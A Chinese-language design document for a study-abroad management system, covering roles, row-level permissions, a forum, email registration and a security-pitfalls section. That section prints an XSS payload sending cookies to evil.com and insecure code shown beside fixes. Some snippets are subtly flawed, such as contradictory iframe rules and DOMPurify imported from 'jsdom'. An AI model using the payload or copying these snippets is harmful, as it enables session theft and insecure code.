# 留学管理系统开发方案

## 一、项目概述

留学管理系统是一个面向留学中介机构的企业级应用，用于管理学生留学申请全流程。系统支持多角色协作，实现从学生提交申请到最终批复的完整业务闭环。

## 二、技术栈

| 层级 | 技术选型 | 说明 |
|------|----------|------|
| 前端 | React + Vite | Vite 提供更快的开发体验和构建速度 |
| 后端 | Node.js | 轻量高效，与前端技术栈统一，便于JSON处理 |
| 数据库 | PostgreSQL | 关系型数据库，支持复杂查询，JSON类型灵活 |
| ORM | Prisma | 类型安全的数据库访问层，降低SQL维护成本 |
| 文件存储 | PostgreSQL BYTEA | 直接存储文件到数据库，简化架构 |

## 三、角色与权限

| 角色 | 标识 | 职责 |
|------|------|------|
| 学生 | student | 提交留学申请，上传申请材料，查看申请状态 |
| 审查人员 | reviewer | 审核学生资质，评估申请材料 |
| 批复人员 | approver | 为学生申请的院校专业进行占位操作 |
| 学校管理员 | school_admin | 维护本校信息，设置专业名额，查看本校申请 |
| 数据分析师 | analyst | 业务数据统计与分析 |
| 系统管理员 | admin | 系统最高权限，用户账号管理，角色权限配置 |

## 四、核心业务流程

### 4.1 申请流程状态机（含回流机制）

```
[草稿] ──提交──→ [已提交] ──初审通过──→ [待补充材料] ←──材料不全──┐
                         │                                    │
                         │ 格式错误                            │
                         ▼                                    │
                   [待补充材料] ──重新提交──→ [已提交] ──审核通过──→ [已通过] ──批复──→ [已完成]
                         │                                    │
                         │ 逾期未补                           │
                         ▼                                    │
                      [已驳回]                                │
                         │                                    │
                         └────────审查拒绝────────→ [已拒绝] ←─┘
```

### 4.2 业务流程说明

- **材料不全**：审查人员发现缺少必要材料，退回让学生补充
- **格式错误**：文件格式不符合要求（如需要PDF但提交了图片）
- **逾期未补**：学生在规定时间内未补充材料，申请自动驳回
- **审查拒绝**：资质审核不通过，直接拒绝申请

### 4.3 状态流转规则

| 当前状态 | 可执行操作 | 目标状态 | 执行角色 |
|----------|------------|----------|----------|
| draft | submit | submitted | 学生 |
| submitted | request_resubmit | pending_supplement | 审查人员 |
| submitted | review_pass | approved | 审查人员 |
| submitted | review_reject | rejected | 审查人员 |
| pending_supplement | resubmit | submitted | 学生 |
| pending_supplement | expire | rejected | 系统 |
| approved | approve | completed | 批复人员 |

## 五、功能模块

### 5.1 用户与权限模块

- [x] 用户注册、登录、密码管理
- [x] 基于RBAC的权限控制（角色-权限关联）
- [x] **数据行级权限控制**（见5.8）
- [x] 角色管理与权限分配
- [ ] 操作审计日志 ⏳

### 5.2 学生模块

- [x] 留学申请表单填写
- [x] 申请材料上传与管理（存储到数据库）
- [x] 申请进度查询
- [x] 申请记录查看
- [x] 补充材料功能

### 5.3 审查模块

- [x] 待审核申请列表（仅展示分配的申请）
- [x] 资质审核操作（通过/要求补充/拒绝）
- [x] 审核意见填写
- [x] 审核历史记录

### 5.4 批复模块

- [x] 待批复申请列表（按学校/专业筛选）
- [x] 院校专业占位操作
- [x] 批复结果记录

### 5.5 学校管理模块

- [x] 学校信息维护（CRUD）
- [x] 专业信息管理（增删改查）
- [x] 名额设置与分配
- [x] **本校申请查询（行级权限隔离）**

### 5.6 数据分析模块

- [x] 申请数据统计
- [x] 各阶段通过率分析
- [x] 学校专业热度分析
- [ ] 数据报表导出 ⏳

### 5.7 系统管理模块

- [x] 用户账号管理
- [ ] 角色权限配置 ⏳
- [x] 系统参数配置
- [ ] 数据备份与恢复 ⏳

### 5.8 数据行级权限控制

#### 权限隔离规则

| 角色 | 数据可见范围 |
|------|--------------|
| 学校管理员 | 仅本校数据（通过 school_id 隔离） |
| 审查人员 | 仅分配给自己的申请 |
| 批复人员 | 仅所负责院校的申请 |
| 数据分析师 | 所有数据（脱敏后） |
| 系统管理员 | 所有数据 |

#### 后端强制校验（示例）

```typescript
// 每个查询都必须携带权限过滤条件
async function getApplications(filters, user) {
  const where = { ...filters };

  // 行级权限校验
  switch (user.role) {
    case 'school_admin':
      where.school_id = user.managed_school_id; // 仅查本校
      break;
    case 'reviewer':
      where.reviewer_id = user.id; // 仅查分配的
      break;
    case 'approver':
      where.school_id = { in: user.managed_school_ids }; // 仅负责的学校
      break;
    case 'analyst':
    case 'admin':
      // 无限制
      break;
  }

  return prisma.application.findMany({ where });
}
```

### 5.9 校际评价与论坛模块

#### 5.9.1 功能概述

校际评价与论坛模块为学生和学校之间提供互动交流平台，学生可以对申请过的学校进行评价和评分，学校可以发布官方宣传信息，所有用户可以在论坛中讨论留学相关话题。学校管理员可通过富文本编辑器上传视频、嵌入YouTube链接和图片来展示学校特色。

#### 5.9.2 功能清单

| 功能 | 说明 | 优先级 | 状态 | 角色 |
|------|------|--------|------|------|
| 学校评价 | 学生对申请过的学校进行1-5星评分和文字评价 | 高 | ✅ 已完成 | 学生 |
| 评价管理 | 查看评价、编辑评价、删除评价、评价统计 | 高 | ✅ 已完成 | 学生/管理员 |
| 学校宣传 | 学校管理员发布官方公告、招生信息、新闻动态 | 高 | ✅ 已完成 | 学校管理员/系统管理员 |
| **学校视频介绍** | 富文本编辑器支持上传本地视频或嵌入YouTube视频链接展示学校 | 高 | ✅ 已完成 | 学校管理员/系统管理员 |
| **图片上传** | 富文本编辑器支持上传图片(本地存储) | 高 | ✅ 已完成 | 学校管理员/系统管理员 |
| 论坛帖子 | 用户发布留学相关讨论帖，支持分类浏览 | 高 | ✅ 已完成 | 所有登录用户 |
| 评论互动 | 对帖子和评价进行评论、点赞 | 中 | ✅ 已完成 | 所有登录用户 |
| 内容审核 | 管理员审核用户生成内容(UGC) | 中 | ⏳ 待开发 | 系统管理员 |
| 精华置顶 | 管理员设置精华帖、置顶帖 | 低 | ⏳ 待开发 | 系统管理员 |
| 消息通知 | 用户间@提醒、评价回复通知 | 低 | ⏳ 待开发 | 所有登录用户 |

#### 5.9.3 数据权限规则

| 内容类型 | 创建权限 | 查看权限 | 管理权限 |
|----------|----------|----------|----------|
| 学校评价 | 仅评价过该校的学生 | 公开 | 仅作者/管理员 |
| 论坛帖子 | 所有登录用户 | 公开(按分类) | 仅作者/管理员 |
| 学校宣传 | 学校管理员/系统管理员 | 公开 | 仅对应学校管理员/系统管理员 |
| 帖子评论 | 所有登录用户 | 跟随帖子 | 仅作者/管理员 |

#### 5.9.4 富文本编辑器功能

富文本编辑器需要支持以下多媒体功能（用于学校宣传和论坛帖子）：

##### 5.9.4.1 支持的媒体类型

| 媒体类型 | 实现方式 | 存储位置 | 限制 |
|----------|----------|----------|------|
| 图片 | 直接嵌入HTML | 数据库/BYTEA 或 OSS | 单文件≤5MB，支持JPG/PNG/GIF/WebP |
| 本地视频 | 上传后嵌入`<video>`标签 | 服务器文件系统或 OSS | 单文件≤100MB，支持MP4/WebM |
| YouTube视频 | 嵌入`<iframe>` | 不占用存储 | 仅支持有效YouTube链接 |

##### 5.9.4.2 YouTube嵌入安全处理

```typescript
// YouTube链接转换函数
function embedYouTubeUrl(input: string): string {
  // 匹配多种YouTube URL格式
  const patterns = [
    /(?:https?:\/\/)?(?:www\.)?youtube\.com\/watch\?v=([a-zA-Z0-9_-]+)/,
    /(?:https?:\/\/)?(?:www\.)?youtu\.be\/([a-zA-Z0-9_-]+)/,
    /(?:https?:\/\/)?(?:www\.)?youtube\.com\/embed\/([a-zA-Z0-9_-]+)/
  ];

  for (const pattern of patterns) {
    const match = input.match(pattern);
    if (match) {
      // 转换为embed格式并添加安全属性
      return `https://www.youtube.com/embed/${match[1]}?rel=0&modestbranding=1`;
    }
  }

  return input; // 非YouTube链接原样返回
}

// 富文本清洗时白名单iframe的YouTube域名
import DOMPurify from 'dompurify';

const config = {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'ol', 'ul', 'li', 'a', 'img', 'blockquote', 'code', 'iframe', 'video', 'source'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'class', 'width', 'height', 'allowfullscreen', 'frameborder', 'target'],
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
  // 自定义hook：只允许YouTube的embed域名
  FORBID_TAGS: ['iframe'],
  FORBID_ATTR: ['srcdoc']
};

// 实际使用时，通过ALLOWED_URI_REGEXP限制src必须来自youtube.com
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'IFRAME') {
    // 只允许YouTube域名
    if (!node.src.includes('youtube.com/embed/')) {
      node.remove();
    }
  }
});
```

##### 5.9.4.3 图片上传处理

```typescript
// 图片上传API示例
async function uploadImage(req, res) {
  const user = getUser(req);

  // 权限校验：仅学校管理员和系统管理员可上传
  if (!['school_admin', 'admin'].includes(user.role)) {
    return res.status(403).json({ error: '权限不足' });
  }

  const file = req.file; // 使用multer处理文件上传

  // 文件类型校验
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
  if (!allowedTypes.includes(file.mimetype)) {
    return res.status(400).json({ error: '仅支持JPG/PNG/GIF/WebP格式' });
  }

  // 文件大小校验 (5MB)
  if (file.size > 5 * 1024 * 1024) {
    return res.status(400).json({ error: '图片大小不能超过5MB' });
  }

  // 生成唯一文件名
  const filename = `${Date.now()}-${crypto.randomUUID()}${path.extname(file.originalname)}`;

  // 存储到本地或OSS
  const url = await saveFile(file.buffer, filename);

  res.json({ url });
}

// TipTap编辑器图片上传配置
const editorConfig = {
  extensions: [
    Image.extend({
      attrs: {
        src: { default: null },
        alt: { default: null }
      },
      parseHTML: () => ({ tag: 'img[src]' }),
      renderHTML: ({ attrs }) => ['img', { src: attrs.src, alt: attrs.alt }]
    })
  ],
  // 图片上传处理
  uploadHandler: async (file) => {
    const formData = new FormData();
    formData.append('image', file);

    const response = await fetch('/api/upload/image', {
      method: 'POST',
      body: formData
    });

    const { url } = await response.json();
    return { src: url };
  }
};
```

##### 5.9.4.4 视频上传处理

```typescript
// 视频上传API示例
async function uploadVideo(req, res) {
  const user = getUser(req);

  if (!['school_admin', 'admin'].includes(user.role)) {
    return res.status(403).json({ error: '权限不足' });
  }

  const file = req.file;

  // 文件类型校验
  const allowedTypes = ['video/mp4', 'video/webm'];
  if (!allowedTypes.includes(file.mimetype)) {
    return res.status(400).json({ error: '仅支持MP4/WebM格式' });
  }

  // 文件大小校验 (100MB)
  if (file.size > 100 * 1024 * 1024) {
    return res.status(400).json({ error: '视频大小不能超过100MB' });
  }

  const filename = `${Date.now()}-${crypto.randomUUID()}.mp4`;
  const url = await saveFile(file.buffer, filename);

  res.json({ url });
}
```

#### 5.9.5 技术架构

```
┌─────────────────────────────────────────────────────────────┐
│                      前端 (React)                           │
├─────────────────────────────────────────────────────────────┤
│  /forum          - 论坛首页(帖子列表)                        │
│  /school-reviews - 学校评价列表                             │
│  /school/:id     - 学校详情(含评价/宣传/论坛)                 │
│  /post/:id       - 帖子详情                                 │
│  /create-post    - 创建帖子                                 │
│  /my-posts       - 我的帖子管理                             │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                      后端 (Node.js)                         │
├─────────────────────────────────────────────────────────────┤
│  POST   /api/reviews              - 创建学校评价             │
│  GET    /api/reviews/school/:id   - 获取学校评价列表         │
│  GET    /api/reviews/stats/:id    - 获取评分统计            │
│  PUT    /api/reviews/:id          - 编辑评价                 │
│  DELETE /api/reviews/:id          - 删除评价                 │
│                                                             │
│  POST   /api/posts                - 创建论坛帖子             │
│  GET    /api/posts                - 获取帖子列表             │
│  GET    /api/posts/:id            - 获取帖子详情             │
│  PUT    /api/posts/:id            - 编辑帖子                 │
│  DELETE /api/posts/:id            - 删除帖子                 │
│  POST   /api/posts/:id/view       - 增加浏览量               │
│  POST   /api/posts/:id/like       - 点赞/取消点赞            │
│  POST   /api/posts/:id/comments   - 添加评论                 │
│                                                             │
│  POST   /api/school-promo         - 发布学校宣传             │
│  GET    /api/school-promo/:id    - 获取宣传列表              │
│  PUT    /api/school-promo/:id    - 编辑宣传                  │
│  DELETE /api/school-promo/:id    - 删除宣传                  │
│                                                             │
│  POST   /api/upload/image         - 上传图片(仅管理员)        │
│  POST   /api/upload/video         - 上传视频(仅管理员)        │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                    数据库 (PostgreSQL)                       │
├─────────────────────────────────────────────────────────────┤
│  SchoolReview  - 学校评价表                                  │
│  ForumPost     - 论坛帖子表                                  │
│  PostComment   - 帖子评论表                                  │
│  PostLike      - 帖子点赞表                                  │
│  SchoolPost    - 学校宣传表                                  │
└─────────────────────────────────────────────────────────────┘
```

#### 5.9.5 开发阶段划分

| 阶段 | 内容 | 状态 | 依赖关系 |
|------|------|------|----------|
| Phase 1 | 数据库设计、Prisma模型扩展(含Media模型) | ✅ 已完成 | 无 |
| Phase 2 | 后端API开发(评价+论坛+宣传+多媒体上传) | ✅ 已完成 | Phase 1 |
| Phase 3 | 前端页面开发(论坛+评价+富文本编辑器) | ✅ 已完成 | Phase 2 |
| Phase 4 | 高级功能(审核+通知) | ⏳ 待开发 | Phase 3 |
| Phase 5 | 富文本编辑器集成(图片/视频/YouTube) | ✅ 已完成 | Phase 3 |
| Phase 6 | 邮箱验证码注册 | ⏳ 待开发 | Phase 1 |

**当前进度: Phase 5 完成，Phase 6 待开发**

#### 5.9.6 邮箱验证码注册技术方案

##### 6.1 功能概述

为增强账号注册安全性，防止恶意注册和机器人攻击，引入邮箱验证码注册机制。用户需填写邮箱地址并通过验证码验证后才能完成注册。

##### 6.2 业务流程

```
[注册表单] → [填写邮箱] → [发送验证码] → [填写验证码] → [验证通过] → [注册成功]
                                         ↓
                                    [验证码错误] → [重新输入验证码]
                                         ↓
                                    [验证码过期] → [重新发送验证码]
```

##### 6.3 技术方案

###### 6.3.1 数据库模型扩展

```prisma
model EmailVerification {
  id          String   @id @default(uuid())
  email       String
  code        String   // 6位数字验证码
  expires_at  DateTime // 过期时间 (10分钟)
  type        VerificationType // 注册验证码 / 找回密码验证码
  used        Boolean  @default(false) // 是否已使用
  created_at  DateTime @default(now())

  @@index([email, type])
  @@map("email_verifications")
}

enum VerificationType {
  REGISTER
  RESET_PASSWORD
}
```

###### 6.3.2 用户模型调整

```prisma
model User {
  // ... existing fields
  email       String?   // 注册时填写
  email_verified Boolean @default(false) // 邮箱是否已验证
  // ... existing relations
}
```

###### 6.3.3 验证码服务

```typescript
// services/emailService.ts
import nodemailer from 'nodemailer';
import crypto from 'crypto';

const VERIFICATION_CODE_EXPIRY = 10 * 60 * 1000; // 10分钟
const VERIFICATION_CODE_LENGTH = 6;

// 生成6位数字验证码
function generateCode(): string {
  return crypto.randomInt(100000, 999999).toString();
}

// 发送验证码邮件
async function sendVerificationEmail(email: string, code: string): Promise<void> {
  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: parseInt(process.env.SMTP_PORT || '587'),
    secure: false,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });

  await transporter.sendMail({
    from: `"留学管理系统" <${process.env.SMTP_USER}>`,
    to: email,
    subject: '【留学管理系统】邮箱验证码',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #333;">邮箱验证</h2>
        <p>您好，您正在注册留学管理系统账号。</p>
        <p style="font-size: 24px; font-weight: bold; color: #0066cc;">
          您的验证码是：${code}
        </p>
        <p style="color: #666; font-size: 14px;">
          验证码将在 ${VERIFICATION_CODE_EXPIRY / 60000} 分钟后过期。
        </p>
        <p style="color: #999; font-size: 12px;">
          如果您没有进行此操作，请忽略此邮件。
        </p>
      </div>
    `,
  });
}
```

###### 6.3.4 API 接口设计

| 接口 | 方法 | 说明 | 请求体 |
|------|------|------|--------|
| `/api/auth/send-code` | POST | 发送验证码 | `{ email: string, type: 'REGISTER' \| 'RESET_PASSWORD' }` |
| `/api/auth/verify-code` | POST | 验证验证码 | `{ email: string, code: string, type: string }` |
| `/api/auth/register` | POST | 注册(需验证) | `{ username, password, email, code }` |

###### 6.3.5 发送验证码接口

```typescript
// controllers/authController.ts
async function sendVerificationCode(req, res) {
  const { email, type } = req.body;

  // 1. 校验邮箱格式
  if (!isValidEmail(email)) {
    return res.status(400).json({ error: '邮箱格式不正确' });
  }

  // 2. 频率限制：同一邮箱5分钟内只能发送3次
  const recentCodes = await prisma.emailVerification.findMany({
    where: {
      email,
      type,
      created_at: { gte: new Date(Date.now() - 5 * 60 * 1000) },
    },
    orderBy: { created_at: 'desc' },
  });

  if (recentCodes.length >= 3) {
    return res.status(429).json({
      error: '发送过于频繁，请稍后再试',
      retryAfter: 300 - Math.floor((Date.now() - recentCodes[0].created_at.getTime()) / 1000)
    });
  }

  // 3. 生成验证码
  const code = generateCode();
  const expires_at = new Date(Date.now() + VERIFICATION_CODE_EXPIRY);

  // 4. 存储验证码（软删除旧验证码）
  await prisma.emailVerification.updateMany({
    where: { email, type, used: false },
    data: { used: true },
  });

  await prisma.emailVerification.create({
    data: { email, code, expires_at, type },
  });

  // 5. 发送邮件
  try {
    await sendVerificationEmail(email, code);
    res.json({ message: '验证码已发送', expiresIn: VERIFICATION_CODE_EXPIRY / 1000 });
  } catch (error) {
    console.error('邮件发送失败:', error);
    res.status(500).json({ error: '邮件发送失败，请稍后重试' });
  }
}
```

###### 6.3.6 注册接口(带验证码)

```typescript
async function register(req, res) {
  const { username, password, email, code } = req.body;

  // 1. 参数校验
  if (!username || !password || !email || !code) {
    return res.status(400).json({ error: '所有字段均为必填' });
  }

  // 2. 校验验证码
  const verification = await prisma.emailVerification.findFirst({
    where: {
      email,
      code,
      type: 'REGISTER',
      used: false,
      expires_at: { gt: new Date() },
    },
    orderBy: { created_at: 'desc' },
  });

  if (!verification) {
    return res.status(400).json({ error: '验证码错误或已过期' });
  }

  // 3. 标记验证码已使用
  await prisma.emailVerification.update({
    where: { id: verification.id },
    data: { used: true },
  });

  // 4. 检查用户名唯一性
  const existingUser = await prisma.user.findUnique({ where: { username } });
  if (existingUser) {
    return res.status(400).json({ error: '用户名已被注册' });
  }

  // 5. 检查邮箱唯一性
  const existingEmail = await prisma.user.findFirst({ where: { email } });
  if (existingEmail) {
    return res.status(400).json({ error: '该邮箱已被注册' });
  }

  // 6. 创建用户
  const hashedPassword = await bcrypt.hash(password, 10);
  const user = await prisma.user.create({
    data: {
      username,
      password: hashedPassword,
      email,
      email_verified: true,
      role: 'student',
    },
  });

  // 7. 生成JWT
  const token = generateToken(user);

  res.status(201).json({ user: sanitizeUser(user), token });
}
```

##### 6.4 前端实现

###### 6.4.1 注册表单组件

```typescript
// components/RegisterForm.tsx
interface RegisterFormState {
  username: string;
  password: string;
  confirmPassword: string;
  email: string;
  code: string;
  step: 'form' | 'verify'; // 表单步骤
  countdown: number; // 倒计时
}

function RegisterForm() {
  const [state, setState] = useState<RegisterFormState>({
    username: '',
    password: '',
    confirmPassword: '',
    email: '',
    code: '',
    step: 'form',
    countdown: 0,
  });

  // 发送验证码
  const handleSendCode = async () => {
    if (!state.email) {
      toast.error('请输入邮箱');
      return;
    }

    const response = await authService.sendCode(state.email, 'REGISTER');
    if (response.success) {
      setState(s => ({ ...s, step: 'verify', countdown: 60 }));
      startCountdown();
      toast.success('验证码已发送');
    }
  };

  // 注册提交
  const handleSubmit = async () => {
    if (state.password !== state.confirmPassword) {
      toast.error('两次密码不一致');
      return;
    }

    const response = await authService.register({
      username: state.username,
      password: state.password,
      email: state.email,
      code: state.code,
    });

    if (response.success) {
      navigate('/login');
      toast.success('注册成功');
    }
  };

  return (
    <div className="space-y-4">
      {state.step === 'form' ? (
        <>
          <Input
            label="用户名"
            value={state.username}
            onChange={e => setState(s => ({ ...s, username: e.target.value }))}
          />
          <Input
            label="密码"
            type="password"
            value={state.password}
            onChange={e => setState(s => ({ ...s, password: e.target.value }))}
          />
          <Input
            label="确认密码"
            type="password"
            value={state.confirmPassword}
            onChange={e => setState(s => ({ ...s, confirmPassword: e.target.value }))}
          />
          <div className="flex gap-2">
            <Input
              label="邮箱"
              type="email"
              value={state.email}
              onChange={e => setState(s => ({ ...s, email: e.target.value }))}
              className="flex-1"
            />
            <Button
              onClick={handleSendCode}
              disabled={state.countdown > 0}
              className="mt-6"
            >
              {state.countdown > 0 ? `${state.countdown}秒` : '获取验证码'}
            </Button>
          </div>
        </>
      ) : (
        <>
          <p className="text-sm text-gray-600">
            验证码已发送至：{state.email}
          </p>
          <Input
            label="验证码"
            value={state.code}
            onChange={e => setState(s => ({ ...s, code: e.target.value }))}
            maxLength={6}
            placeholder="请输入6位验证码"
          />
          <Button variant="link" onClick={handleSendCode}>
            重新获取验证码
          </Button>
        </>
      )}
    </div>
  );
}
```

##### 6.5 安全措施

| 安全措施 | 说明 |
|----------|------|
| 验证码格式 | 6位纯数字，难以暴力猜测 |
| 有效期控制 | 验证码10分钟后自动失效 |
| 频率限制 | 同一邮箱5分钟内最多发送3次 |
| 一次性使用 | 验证码验证后立即标记为已使用 |
| 邮箱唯一性 | 同一邮箱只能注册一个账号 |
| 密码强度 | 密码至少8位，包含大小写字母和数字 |
| 防暴力机制 | 连续5次验证失败，锁定该邮箱1小时 |

##### 6.6 环境变量配置

```bash
# .env
SMTP_HOST=smtp.example.com
SMTP_PORT=587
SMTP_USER=noreply@example.com
SMTP_PASS=your-smtp-password
```

##### 6.7 开发任务清单

| 任务 | 优先级 | 状态 |
|------|--------|------|
| 数据库模型扩展 | 高 | ⏳ |
| 邮件服务开发 | 高 | ⏳ |
| 发送验证码API | 高 | ⏳ |
| 验证验证码API | 高 | ⏳ |
| 注册接口改造 | 高 | ⏳ |
| 前端注册表单 | 高 | ⏳ |
| 单元测试 | 中 | ⏳ |

#### 5.9.7 安全风险与避雷设计

##### 雷点一：评价权限的"逻辑后门"

**风险描述**：SchoolReview 仅允许评价过该校的学生创建，但 Schema 中 SchoolReview 与 Application 表没有物理外键约束。如果后端 API 仅校验 `role === 'student'`，恶意用户可直接刷评价。

**高危漏洞场景**：
```typescript
// ❌ 不安全的实现
async function createReview(req, res) {
  const { school_id, rating, content } = req.body;
  const user = getUser(req);

  // 仅校验了角色，未校验是否真正申请过该校
  if (user.role !== 'student') {
    return res.status(403).json({ error: '仅学生可评价' });
  }

  await prisma.schoolReview.create({
    data: { school_id, user_id: user.id, rating, content }
  });
}
```

**修复方案**：
```typescript
// ✅ 安全的实现
async function createReview(req, res) {
  const { school_id, rating, content } = req.body;
  const user = getUser(req);

  if (user.role !== 'student') {
    return res.status(403).json({ error: '仅学生可评价' });
  }

  // 必须深度校验：学生是否申请过该校且申请状态为已完成
  const hasValidApplication = await prisma.application.findFirst({
    where: {
      student_id: user.id,
      major: { school_id: school_id },
      status: 'completed'  // 仅允许已完成申请的学生评价
    }
  });

  if (!hasValidApplication) {
    return res.status(403).json({ error: '您尚未完成该校申请，无法评价' });
  }

  // 校验是否已评价（Schema 有唯一索引，但业务层面也需校验）
  const existingReview = await prisma.schoolReview.findUnique({
    where: { school_id_user_id: { school_id, user_id: user.id } }
  });

  if (existingReview) {
    return res.status(400).json({ error: '您已评价过该校' });
  }

  await prisma.schoolReview.create({
    data: { school_id, user_id: user.id, rating, content }
  });
}
```

**进阶优化**：在 Application 表增加 `has_reviewed` 布尔字段，防止重复评价。

---

##### 雷点二：高频操作导致的数据库"行锁"竞争

**风险描述**：ForumPost 表的 `views`、`likes`、`comments` 统计字段在高频更新时会导致数据库行锁竞争，影响核心业务。

**高危场景**：
- 热门帖子被大量用户同时浏览/点赞
- 同一时刻多个用户评论
- 数据库 CPU 100%，导致申请审核超时

**优化方案**：

| 操作 | 实时方案 | 优化方案 |
|------|----------|----------|
| 浏览量 | `UPDATE posts SET views = views + 1` | 前端计数 + Redis 缓存 + 定时同步 |
| 点赞数 | `UPDATE posts SET likes = likes + 1` | Redis INCR + 数据库异步更新 |
| 评论数 | `UPDATE posts SET comments = comments + 1` | 不维护冗余字段，实时 COUNT 查询 |

**推荐实现**：
```typescript
// 点赞操作 - 使用 Redis 解耦
async function likePost(req, res) {
  const { post_id } = req.params;
  const user = getUser(req);

  // 1. 先写用户点赞记录（必须，保证一致性）
  await prisma.postLike.create({
    data: { post_id, user_id: user.id }
  });

  // 2. Redis 累加点赞数（异步，不阻塞响应）
  await redis.incr(`post:${post_id}:likes`);

  // 3. 定时任务同步到数据库（每小时一次）
  // syncLikesToDatabase();

  res.json({ success: true });
}

// 获取帖子时，合并数据库 + Redis 数据
async function getPost(req, res) {
  const post = await prisma.forumPost.findUnique({ ... });

  // 从 Redis 获取最新点赞数
  const redisLikes = await redis.get(`post:${post.id}:likes`);
  post.likes = redisLikes ? parseInt(redisLikes) : post.likes;

  return res.json(post);
}
```

---

##### 雷点三：UGC 数据的"污染"与安全性

**风险描述**：论坛支持富文本内容，XSS 注入攻击是经典漏洞。

**攻击场景**：
```html
<!-- 恶意评价内容 -->
<img src="x" onerror="fetch('http://evil.com/steal?cookie='+document.cookie)">
<a href="javascript:void(0)" onclick="stealSession()">点击查看详情</a>
```

**防御方案**：

```typescript
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

// 后端必须对所有 UGC 内容进行 HTML 清洗
function sanitizeContent(dirtyHtml: string): string {
  return DOMPurify.sanitize(dirtyHtml, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'ol', 'ul', 'li', 'a', 'img', 'blockquote', 'code'],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'class'],
    ALLOW_DATA_ATTR: false,
    // 禁止 javascript: 协议
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i
  });
}

// 评论/评价接口中强制清洗
async function createComment(req, res) {
  const { post_id, content } = req.body;

  // 清洗恶意脚本
  const cleanContent = sanitizeContent(content);

  await prisma.postComment.create({
    data: {
      post_id,
      author_id: req.user.id,
      content: cleanContent
    }
  });
}
```

**前端渲染也要注意**：
```typescript
// React 中使用 dangerouslySetHTML 时务必确保已清洗
import DOMPurify from 'jsdom';

function CommentContent({ content }) {
  return (
    <div
      dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(content)
      }}
    />
  );
}
```

---

##### 雷点四：数据删除关联的"雪崩效应"

**风险描述**：使用 `onDelete: Cascade` 物理删除，当删除大 V 用户或违规学校时，级联删除大量关联数据，导致数据库瞬间负载飙升。

**高危场景**：
- 删除一个有 10000 条评论的用户 → 瞬间执行 10001 条 DELETE
- 删除一所热门学校 → 删除所有学生评价、帖子、评论
- 数据库 CPU 100%，正在进行的申请审核超时失败

**优化方案：软删除 + 用户快照**

```prisma
model ForumPost {
  id          String   @id @default(uuid())
  author_id   String
  author_name String?  // 作者快照，避免依赖 User 表
  is_deleted  Boolean  @default(false)  // 软删除标记
  deleted_at  DateTime?
  ...
}

// 删除用户时，不物理删除帖子
async function deleteUser(userId) {
  // 1. 将用户所有帖子标记为"已注销用户"发布
  await prisma.forumPost.updateMany({
    where: { author_id: userId },
    data: {
      author_id: 'SYSTEM_DELETED_USER_ID',  // 固定系统ID
      author_name: '已注销用户',
      is_deleted: false  // 保留帖子内容
    }
  });

  // 2. 软删除用户
  await prisma.user.update({
    where: { id: userId },
    data: { is_deleted: true, deleted_at: new Date() }
  });
}

// 查询时自动过滤已删除
async function getPosts(filters) {
  return prisma.forumPost.findMany({
    where: {
      ...filters,
      is_deleted: false  // 自动排除已删除
    }
  });
}
```

**学校删除同理**：
```typescript
async function deleteSchool(schoolId) {
  // 1. 将学校评价转移到"已下线学校"
  await prisma.schoolReview.updateMany({
    where: { school_id: schoolId },
    data: { status: 'hidden' }  // 隐藏而非删除
  });

  // 2. 软删除学校
  await prisma.school.update({
    where: { id: schoolId },
    data: { is_deleted: true }
  });
}
```

---

##### 雷点五：管理权力的"越权"重叠

**风险描述**：学校管理员可管理学校宣传，但如果权限校验不严，A 校管理员可能修改 B 校的宣传内容。

**高危漏洞场景**：
```typescript
// ❌ 不安全的实现
async function updateSchoolPromo(req, res) {
  const { id } = req.params;
  const { title, content } = req.body;
  const user = getUser(req);

  // 仅校验了角色
  if (user.role !== 'school_admin') {
    return res.status(403).json({ error: '权限不足' });
  }

  // 未校验是否是自己的学校！
  await prisma.schoolPost.update({
    where: { id },
    data: { title, content }
  });
}
```

**修复方案：强化行级权限校验**

```typescript
// ✅ 安全的实现
async function updateSchoolPromo(req, res) {
  const { id } = req.params;
  const { title, content } = req.body;
  const user = getUser(req);

  // 1. 校验角色
  if (!['school_admin', 'admin'].includes(user.role)) {
    return res.status(403).json({ error: '权限不足' });
  }

  // 2. 获取要修改的内容
  const promo = await prisma.schoolPost.findUnique({ where: { id } });

  if (!promo) {
    return res.status(404).json({ error: '内容不存在' });
  }

  // 3. 行级权限校验：如果是学校管理员，必须属于同一学校
  if (user.role === 'school_admin') {
    const isOwnSchool = user.managed_schools.includes(promo.school_id);

    if (!isOwnSchool) {
      return res.status(403).json({ error: '无权管理其他学校的宣传内容' });
    }
  }

  // 4. 更新内容
  await prisma.schoolPost.update({
    where: { id },
    data: { title, content }
  });
}

// 删除操作同理
async function deleteSchoolPromo(req, res) {
  const { id } = req.params;
  const user = getUser(req);

  const promo = await prisma.schoolPost.findUnique({ where: { id } });

  if (!promo) {
    return res.status(404).json({ error: '内容不存在' });
  }

  if (user.role === 'school_admin' && !user.managed_schools.includes(promo.school_id)) {
    return res.status(403).json({ error: '无权删除其他学校的宣传内容' });
  }

  // 软删除而非物理删除
  await prisma.schoolPost.update({
    where: { id },
    data: { status: 'hidden' }
  });
}
```

**其他需要行级校验的 API**：

| API | 校验字段 |
|-----|----------|
| `PUT /api/reviews/:id` | `review.school_id` 必须在 `user.managed_schools` 中（学校管理员）或 `review.user_id === user.id`（作者） |
